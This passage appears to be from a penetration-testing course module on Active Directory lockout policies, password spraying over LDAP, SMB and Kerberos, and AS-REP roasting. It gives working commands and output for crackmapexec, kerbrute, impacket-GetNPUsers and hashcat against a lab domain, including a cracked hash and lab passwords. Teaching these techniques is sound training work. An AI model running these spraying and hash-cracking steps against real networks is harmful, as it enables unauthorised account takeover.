### Understanding Account Lockout Policies and Password Spraying Attacks

To better understand account lockouts, let's review the domain’s account policy as a domain user, Jeff, on CLIENT75. We can connect to the system using the password `HenchmanPutridBonbon11` via RDP. Next, we’ll open a regular PowerShell window and execute the `net accounts` command to obtain the account policy.

```powershell
PS C:\Users\jeff> net accounts
Force user logoff how long after time expires?: Never
Minimum password age (days): 1
Maximum password age (days): 42
Minimum password length: 7
Length of password history maintained: 24
Lockout threshold: 5
Lockout duration (minutes): 30
Lockout observation window (minutes): 30
Computer role: WORKSTATION
The command completed successfully.
```

**Listing 797 - Results of the `net accounts` command**

From the output, we can focus on the **Lockout threshold**, which indicates that a user will be locked out after five failed login attempts. This means we can safely attempt four logins before triggering a lockout. Additionally, the **Lockout observation window** is set to 30 minutes, meaning that after 30 minutes from the last failed login, we can make additional attempts.

With these settings, we could attempt 192 logins in a 24-hour period against every domain user without triggering a lockout, assuming the actual users don’t fail a login attempt. An attack like this might involve compiling a short list of very common passwords and leveraging it against a large number of users. This type of attack can sometimes reveal weak account passwords in the organization. However, this would also generate a significant amount of network traffic.

### Types of Password Spraying Attacks in an AD Environment

#### 1. LDAP and ADSI-Based Password Spraying

The first type of password spraying attack uses LDAP and ADSI to perform a low and slow password attack against AD users. In the Module Active Directory Introduction and Enumeration, we performed queries against the domain controller as a logged-in user with `DirectoryEntry`. However, we can also make queries in the context of a different user by setting the `DirectoryEntry` instance.

```powershell
PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name
PS C:\Users\jeff> $SearchString = "LDAP://"
PS C:\Users\jeff> $SearchString += $PDC + "/"
PS C:\Users\jeff> $DistinguishedName = "DC=$(($domainObj.Name.Replace('.', ',DC=')))"
PS C:\Users\jeff> $SearchString += $DistinguishedName
PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

**Listing 798 - Authenticating using `DirectoryEntry`**

If the password for the user account is correct, the object creation will be successful. If the password is invalid, no object will be created, and we will receive an exception.

We can use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window. This password spraying tactic is already implemented in the PowerShell script `C:\Tools\Spray-Passwords.ps1` on CLIENT75.

```powershell
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
'pete' with password: 'Nexus123!'
'jen' with password: 'Nexus123!'
```

**Listing 801 - Using `Spray-Passwords` to attack user accounts**

#### 2. SMB-Based Password Spraying

The second type of password spraying attack leverages SMB, a traditional approach for password attacks in AD. For every authentication attempt, a full SMB connection has to be set up and then terminated, making this method very noisy and slow compared to other techniques.

We can use `crackmapexec` on Kali to perform this kind of password spraying. We’ll select `smb` as the protocol and enter the IP address of any domain-joined system, such as CLIENT75 (192.168.50.75). We can provide a list or single users and passwords to `-u` and `-p`, respectively. Additionally, we will enter the domain name for `-d` and provide the option `--continue-on-success` to avoid stopping at the first valid credential.

```bash
kali@kali:~$ cat users.txt
dave
jen
pete
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB 192.168.50.75 445 CLIENT75 [*] Windows 10.0 Build 22000 x64
(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB 192.168.50.75 445 CLIENT75 [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\jen:Nexus123!
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\pete:Nexus123!
```

**Listing 802 - Using `crackmapexec` to attack user accounts**

`crackmapexec` not only displays if credentials are valid but also indicates if the user has administrative privileges on the target system.

#### 3. Kerberos TGT-Based Password Spraying

The third type of password spraying attack involves obtaining a Kerberos TGT. Using `kinit` on a Linux system, we can obtain and cache a Kerberos TGT by providing a username and password. If the credentials are valid, we’ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid.

We can use the tool `kerbrute` to automate this method. Since `kerbrute` is cross-platform, we can use it on both Windows and Linux.

```powershell
PS C:\Tools> type .\usernames.txt
pete
dave
jen
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
__ __ __
/ /_____ _____/ /_ _______ __/ /____
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ , Using KDC(s):
2022/09/06 20:30:48 > dc1.corp.com:88
2022/09/06 20:30:48 > [+] VALID LOGIN: PI:EMAIL:Nexus123!
2022/09/06 20:30:48 > [+] VALID LOGIN: PI:EMAIL:Nexus123!
2022/09/06 20:30:48 > Done! Tested 3 logins (2 successes) in 0.041 seconds
```

**Listing 804 - Using `kerbrute` to attack user accounts**

### AS-REP Roasting

AS-REP Roasting is an attack that exploits the absence of Kerberos preauthentication. By default, the AD user account option "Do not require Kerberos preauthentication" is disabled, but it can be enabled manually for certain applications and technologies.

On Kali, we can use `impacket-GetNPUsers` to perform AS-REP roasting. We need to specify the IP address of the domain controller, the name of the output file, and the target authentication information.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
Name MemberOf PasswordLastSet LastLogon UAC
---- -------- -------------------------- -------------------------- --------
dave 2022-09-02 19:21:17.285464 2022-09-07 12:45:15.559299 0x410200
```

**Listing 805 - Using `GetNPUsers` to perform AS-REP roasting**

By default, the resulting hash format of `impacket-GetNPUsers` is compatible with Hashcat. We can check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

```bash
kali@kali:~$ hashcat --help | grep -i "Kerberos"
19600 | Kerberos 5, etype 17, TGS-REP | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
```

**Listing 806 - Obtaining the correct mode for Hashcat**

We can now launch Hashcat to crack the AS-REP hash.

```bash
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$23$PI:EMAIL:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b
739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750c
f33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362
fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd865
8b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3
092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc2
2:Flowers1
...
```

**Listing 807 - Cracking the AS-REP hash with Hashcat**

If you receive the Hashcat error “Not enough allocatable device memory for this attack,” shut down your Kali VM and add more RAM to it. 4GB is sufficient for the examples and exercises in this module.

---

This document provides a comprehensive overview of account lockout policies and various types of password spraying attacks in an AD environment. It also includes practical examples and steps to perform these attacks.